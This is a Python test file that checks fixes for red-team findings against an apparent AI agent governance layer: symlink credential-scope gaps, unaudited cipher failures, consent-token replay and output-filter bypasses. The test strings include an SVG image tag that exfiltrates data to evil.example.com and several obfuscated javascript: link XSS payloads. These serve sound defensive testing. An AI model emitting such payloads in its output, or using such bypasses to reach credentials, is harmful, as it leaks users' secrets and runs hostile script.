"""Wave-40 RT9 closure tests: F112 (verify_scope dir-symlink blind spot),
F113 (unaudited raising-cipher refusal), F114 (destination-bound consent
tokens), F115 (loud warning when identity binding is silently unenforced),
F116 (output-filter svg/image + <a href> bypasses).

All synthetic/local, $0. Deterministic: no wall-clock dependence, env
hygiene restored in finally/addCleanup.
"""

import contextlib
import functools
import io
import os
import sys
import tempfile
import unittest
from pathlib import Path

_TESTS_DIR = os.path.dirname(os.path.abspath(__file__))
for _p in (_TESTS_DIR, os.path.dirname(_TESTS_DIR)):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from harness import make_run  # noqa: E402
from gov import log as log_mod  # noqa: E402
from gov.credential_manifest import (  # noqa: E402
    CredentialManifest,
    CredentialManifestError,
)
from gov.output_filter import (  # noqa: E402
    contains_active_content,
    sanitize,
)
from gov.platform_egress import (  # noqa: E402
    EVENT_DENIED,
    PlatformEgressError,
    WorkspaceCollector,
    _DEMO_CIPHER_ENV,
    check_consent,
    demonstration_cipher,
    issue_consent,
)

_PROD_KEY = "sk_live_SYNTHETICPROBEKEY9f3a2c1e4d5b"
_TEST_KEY = "sk_test_SYNTHETICPROBEKEY9f3a2c1e4d5b"
_CONSENT_KEY = b"w40-test-consent-key-32-bytes-ok"
_ARCHIVE_KEY = b"w40-test-archive-key-32bytes-ok!"


@contextlib.contextmanager
def _env(**pairs):
    saved = {k: os.environ.get(k) for k in pairs}
    had = {k: k in os.environ for k in pairs}
    for k, v in pairs.items():
        if v is None:
            os.environ.pop(k, None)
        else:
            os.environ[k] = v
    try:
        yield
    finally:
        for k in pairs:
            if had[k]:
                os.environ[k] = saved[k]
            else:
                os.environ.pop(k, None)


@contextlib.contextmanager
def _dev_keys(enabled=True):
    prev = log_mod._dev_enabled
    log_mod._dev_enabled = enabled
    try:
        yield
    finally:
        log_mod._dev_enabled = prev


@contextlib.contextmanager
def _govrun():
    with _env(GOV_DEV_KEYS="1"), _dev_keys(True):
        yield


def _write(root, rel, content):
    p = Path(root) / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content, encoding="utf-8")
    return p


class _Sink:
    def __init__(self, host):
        self.host = host
        self.uploads = []

    def put(self, name, payload):
        self.uploads.append((name, payload))


def _read_events(ctx):
    return [e.get("event")
            for e in log_mod.read_entries(ctx["log"].path)]


# ---------------------------------------------------------------------------
# F112: verify_scope follows directory symlinks (loop-safe)
# ---------------------------------------------------------------------------

class TestF112VerifyScopeSymlinks(unittest.TestCase):
    def test_dir_symlink_hiding_production_key_is_detected(self):
        # The RT9 miss: a production-shaped key behind an undeclared
        # directory symlink used to be invisible to verify_scope while
        # remaining readable to the agent. Must fail closed now.
        with tempfile.TemporaryDirectory(prefix="w40-f112-") as tmp:
            root = Path(tmp) / "scope"
            root.mkdir()
            realdir = Path(tmp) / "realdir"
            realdir.mkdir()
            (realdir / "prod.key").write_text(_PROD_KEY, encoding="utf-8")
            (root / "linkdir").symlink_to(realdir, target_is_directory=True)
            manifest = CredentialManifest()
            with self.assertRaises(CredentialManifestError) as cm:
                manifest.verify_scope(root)
            self.assertIn("undeclared_credential_in_scope",
                          str(cm.exception))
            self.assertIn("linkdir", str(cm.exception))

    def test_symlink_loop_terminates(self):
        # Cycle-safety: a symlink loop must terminate the pre-run
        # check, not hang it.
        with tempfile.TemporaryDirectory(prefix="w40-f112-") as tmp:
            root = Path(tmp) / "scope"
            root.mkdir()
            (root / "loop").symlink_to(root, target_is_directory=True)
            manifest = CredentialManifest()
            # No credentials anywhere: must pass AND return.
            manifest.verify_scope(root)

    def test_mutual_symlink_loop_with_key_terminates_and_detects(self):
        with tempfile.TemporaryDirectory(prefix="w40-f112-") as tmp:
            a = Path(tmp) / "a"
            b = Path(tmp) / "b"
            a.mkdir()
            b.mkdir()
            (a / "to_b").symlink_to(b, target_is_directory=True)
            (b / "to_a").symlink_to(a, target_is_directory=True)
            (b / "prod.key").write_text(_PROD_KEY, encoding="utf-8")
            manifest = CredentialManifest()
            with self.assertRaises(CredentialManifestError):
                manifest.verify_scope(a)

    def test_declared_nonprod_behind_symlink_still_passes(self):
        # No false positive: a DECLARED non-production credential
        # reachable through a symlinked dir still verifies.
        with tempfile.TemporaryDirectory(prefix="w40-f112-") as tmp:
            root = Path(tmp) / "scope"
            root.mkdir()
            realdir = Path(tmp) / "realdir"
            realdir.mkdir()
            keyfile = realdir / "test.key"
            keyfile.write_text(_TEST_KEY, encoding="utf-8")
            (root / "linkdir").symlink_to(realdir, target_is_directory=True)
            manifest = CredentialManifest()
            manifest.declare(str(keyfile), credential_id="t1",
                             owner_principal="harness", scope="t",
                             ttl_s=600)
            # Declared via the real path: verify through the symlink
            # must not flag the test-shaped key as undeclared.
            manifest.verify_scope(root)

    def test_regular_file_control_still_detected(self):
        with tempfile.TemporaryDirectory(prefix="w40-f112-") as tmp:
            root = Path(tmp) / "scope"
            root.mkdir()
            _write(root, "prod.key", _PROD_KEY)
            manifest = CredentialManifest()
            with self.assertRaises(CredentialManifestError):
                manifest.verify_scope(root)


# ---------------------------------------------------------------------------
# F113: a raising cipher refuses AUDITED
# ---------------------------------------------------------------------------

class TestF113CipherFailureAudited(unittest.TestCase):
    def _collector(self, ctx, allow=("idx.example.com",)):
        return WorkspaceCollector(ctx["log"], ctx["policy"],
                                  egress_allowlist=set(allow),
                                  consent_key=_CONSENT_KEY)

    def test_wrapped_demo_cipher_refusal_is_audited(self):
        # The RT9 miss: functools.partial(demonstration_cipher) with the
        # env gate unset skipped the identity-matched audited refusal
        # and the in-function raise escaped with zero audit entries.
        with _govrun(), _env(**{_DEMO_CIPHER_ENV: None}):
            with tempfile.TemporaryDirectory(prefix="w40-f113-") as tmp:
                ws = Path(tmp) / "ws"
                ws.mkdir()
                (ws / "f.txt").write_text("hello\n", encoding="utf-8")
                ctx = make_run()
                collector = self._collector(ctx)
                token = issue_consent(ctx["log"], _CONSENT_KEY,
                                      granted_by="op1", ttl_s=600)
                sink = _Sink("idx.example.com")
                with self.assertRaises(PlatformEgressError) as cm:
                    collector.collect(
                        ws, consent=token,
                        destination="idx.example.com", sink=sink,
                        archive_key=_ARCHIVE_KEY,
                        cipher=functools.partial(demonstration_cipher))
                self.assertIn("archive_cipher_failed", str(cm.exception))
                self.assertEqual(sink.uploads, [])
                events = _read_events(ctx)
                self.assertIn(EVENT_DENIED, events)

    def test_failing_deployer_cipher_refusal_is_audited(self):
        # Any deployer cipher that raises -- not just the demo one --
        # takes the audited path now.
        def boom(key, nonce, data):
            raise RuntimeError("HSM unreachable")

        with _govrun():
            with tempfile.TemporaryDirectory(prefix="w40-f113-") as tmp:
                ws = Path(tmp) / "ws"
                ws.mkdir()
                (ws / "f.txt").write_text("hello\n", encoding="utf-8")
                ctx = make_run()
                collector = self._collector(ctx)
                token = issue_consent(ctx["log"], _CONSENT_KEY,
                                      granted_by="op1", ttl_s=600)
                with self.assertRaises(PlatformEgressError) as cm:
                    collector.collect(
                        ws, consent=token,
                        destination="idx.example.com",
                        sink=_Sink("idx.example.com"),
                        archive_key=_ARCHIVE_KEY, cipher=boom)
                self.assertIn("archive_cipher_failed", str(cm.exception))
                self.assertIn("HSM unreachable", str(cm.exception))
                self.assertIn(EVENT_DENIED, _read_events(ctx))

    def test_working_cipher_still_succeeds(self):
        # No regression: a cipher that works still uploads, audited.
        with _govrun(), _env(**{_DEMO_CIPHER_ENV: "1"}):
            with tempfile.TemporaryDirectory(prefix="w40-f113-") as tmp:
                ws = Path(tmp) / "ws"
                ws.mkdir()
                (ws / "f.txt").write_text("hello\n", encoding="utf-8")
                ctx = make_run()
                collector = self._collector(ctx)
                token = issue_consent(ctx["log"], _CONSENT_KEY,
                                      granted_by="op1", ttl_s=600)
                sink = _Sink("idx.example.com")
                collector.collect(ws, consent=token,
                                  destination="idx.example.com",
                                  sink=sink, archive_key=_ARCHIVE_KEY,
                                  cipher=demonstration_cipher)
                self.assertEqual(len(sink.uploads), 1)


# ---------------------------------------------------------------------------
# F114: destination-bound consent tokens
# ---------------------------------------------------------------------------

class TestF114ConsentDestinationBinding(unittest.TestCase):
    def test_bound_token_replayed_to_other_destination_refused(self):
        with _govrun():
            ctx = make_run()
            token = issue_consent(ctx["log"], _CONSENT_KEY,
                                  granted_by="op1", ttl_s=600,
                                  destination="a.example.com")
            # Same destination: valid.
            check_consent(token, _CONSENT_KEY,
                          destination="a.example.com")
            # Other destination: refused.
            with self.assertRaises(PlatformEgressError) as cm:
                check_consent(token, _CONSENT_KEY,
                              destination="b.example.com")
            self.assertIn("does not cover", str(cm.exception))
            # No destination presented at all: refused (fail closed).
            with self.assertRaises(PlatformEgressError) as cm2:
                check_consent(token, _CONSENT_KEY)
            self.assertIn("no destination presented", str(cm2.exception))

    def test_bound_token_end_to_end_through_collector(self):
        with _govrun(), _env(**{_DEMO_CIPHER_ENV: "1"}):
            with tempfile.TemporaryDirectory(prefix="w40-f114-") as tmp:
                ws = Path(tmp) / "ws"
                ws.mkdir()
                (ws / "f.txt").write_text("hello\n", encoding="utf-8")
                ctx = make_run()
                collector = WorkspaceCollector(
                    ctx["log"], ctx["policy"],
                    egress_allowlist={"a.example.com", "b.example.com"},
                    consent_key=_CONSENT_KEY)
                token = issue_consent(ctx["log"], _CONSENT_KEY,
                                      granted_by="op1", ttl_s=600,
                                      destination="a.example.com")
                sink_a = _Sink("a.example.com")
                collector.collect(ws, consent=token,
                                  destination="a.example.com",
                                  sink=sink_a, archive_key=_ARCHIVE_KEY,
                                  cipher=demonstration_cipher)
                self.assertEqual(len(sink_a.uploads), 1)
                # Replay to the other allowlisted destination: refused
                # AND audited.
                with self.assertRaises(PlatformEgressError):
                    collector.collect(ws, consent=token,
                                      destination="b.example.com",
                                      sink=_Sink("b.example.com"),
                                      archive_key=_ARCHIVE_KEY,
                                      cipher=demonstration_cipher)
                self.assertIn(EVENT_DENIED, _read_events(ctx))

    def test_unbound_token_keeps_bearer_behavior_documented(self):
        # Unbound tokens (no destination=) keep the previous bearer
        # behavior: any destination, multi-use. Explicit operator
        # choice, documented -- not a silent default.
        with _govrun():
            ctx = make_run()
            token = issue_consent(ctx["log"], _CONSENT_KEY,
                                  granted_by="op1", ttl_s=600)
            check_consent(token, _CONSENT_KEY,
                          destination="anything.example.com")
            check_consent(token, _CONSENT_KEY)  # no destination either

    def test_binding_cannot_be_stripped_without_key(self):
        # Tampering the destination field off a bound token breaks the
        # MAC (destination is MACed under pec-v2).
        with _govrun():
            ctx = make_run()
            token = issue_consent(ctx["log"], _CONSENT_KEY,
                                  granted_by="op1", ttl_s=600,
                                  destination="a.example.com")
            stripped = dict(token.as_dict())
            stripped["destination"] = None
            with self.assertRaises(PlatformEgressError) as cm:
                check_consent(stripped, _CONSENT_KEY,
                              destination="b.example.com")
            self.assertIn("bad_mac", str(cm.exception))

    def test_empty_destination_rejected_at_issuance(self):
        with _govrun():
            ctx = make_run()
            with self.assertRaises(PlatformEgressError):
                issue_consent(ctx["log"], _CONSENT_KEY,
                              granted_by="op1", destination="")


# ---------------------------------------------------------------------------
# F115: loud warning when identity binding is silently unenforced
# ---------------------------------------------------------------------------

class TestF115BindingUnenforcedWarning(unittest.TestCase):
    def _ctx_with_manifest(self, session_identity):
        ctx = make_run()
        manifest = CredentialManifest()
        keyfile = ctx["run_dir"] / "k1.txt"
        keyfile.write_text(_TEST_KEY, encoding="utf-8")
        manifest.declare(str(keyfile), credential_id="victim-cred",
                         owner_principal="victim", scope="pay",
                         ttl_s=3600)
        # Rebuild the run with the manifest (+ optional session
        # identity), the way a deployment wires it.
        return make_run(session_identity=session_identity,
                        credential_manifest=manifest)

    def test_warning_once_with_audit_entry(self):
        # Manifest non-empty + no session identity: one-time loud
        # warning (stderr + audited entry), then quiet.
        ctx = self._ctx_with_manifest(None)
        ex = ctx["executor"]
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            ex._credential_identity_mismatch({"credential_id":
                                              "victim-cred"})
            ex._credential_identity_mismatch({"credential_id":
                                              "victim-cred"})
        warned = err.getvalue()
        self.assertIn("GOVERNANCE WARNING", warned)
        self.assertIn("F115", warned)
        self.assertEqual(warned.count("GOVERNANCE WARNING"), 1)
        events = _read_events(ctx)
        self.assertEqual(events.count("credential_binding_unenforced"), 1)

    def test_no_warning_with_session_identity(self):
        ctx = self._ctx_with_manifest(("a1", "agent", "attacker"))
        ex = ctx["executor"]
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            # Foreign credential -> mismatch True (binding enforced).
            self.assertTrue(ex._credential_identity_mismatch(
                {"credential_id": "victim-cred"}))
        self.assertNotIn("GOVERNANCE WARNING", err.getvalue())
        self.assertNotIn("credential_binding_unenforced",
                         _read_events(ctx))

    def test_no_warning_with_empty_manifest(self):
        # Dev mode with nothing provisioned stays quiet: nothing is
        # unenforced.
        ctx = make_run(session_identity=None)
        ex = ctx["executor"]
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            self.assertFalse(ex._credential_identity_mismatch({}))
        self.assertNotIn("GOVERNANCE WARNING", err.getvalue())


# ---------------------------------------------------------------------------
# F116: output-filter svg/image + <a href> bypasses
# ---------------------------------------------------------------------------

class TestF116OutputFilterBypass(unittest.TestCase):
    def test_svg_image_fetch_neutralized(self):
        text = ('<svg><image href="https://evil.example.com/?d=secret"/>'
                "</svg>")
        hits = contains_active_content(text)
        self.assertTrue(hits)
        out = sanitize(text)
        self.assertNotIn("<svg", out)
        self.assertNotIn("<image", out)

    def test_a_href_javascript_variants_neutralized(self):
        for text in (
            '<a href="javascript:alert(document.domain)">click</a>',
            '<a href="&#106;avascript:alert(1)">click</a>',
            "<a href='javascript:alert(1)'>click</a>",
            '<a href=javascript:alert(1)>click</a>',
            '<a  href = "java\tscript:alert(1)">click</a>',
            '<a title="a>b" href="javascript:alert(1)">x</a>',
        ):
            with self.subTest(text=text[:40]):
                self.assertTrue(contains_active_content(text), text)
                out = sanitize(text)
                self.assertNotIn("<a ", out)
                self.assertNotIn("<a>", out)

    def test_benign_passthroughs_unchanged(self):
        benign = [
            '<a href="https://example.com/page">click</a>',
            "[click](https://example.com)",
            "The <a> tag is an anchor element.",
            "`<a href=\"javascript:x\">`",
            "```\n<a href=\"javascript:x\">\n```",
            "![alt](https://img.example.com/x.png)",
        ]
        for text in benign:
            with self.subTest(text=text[:40]):
                if "img.example.com" in text:
                    hits = contains_active_content(
                        text, image_host_allowlist=("img.example.com",))
                    out = sanitize(
                        text, image_host_allowlist=("img.example.com",))
                else:
                    hits = contains_active_content(text)
                    out = sanitize(text)
                self.assertEqual(hits, [], text)
                self.assertEqual(out, text, text)


if __name__ == "__main__":
    unittest.main()
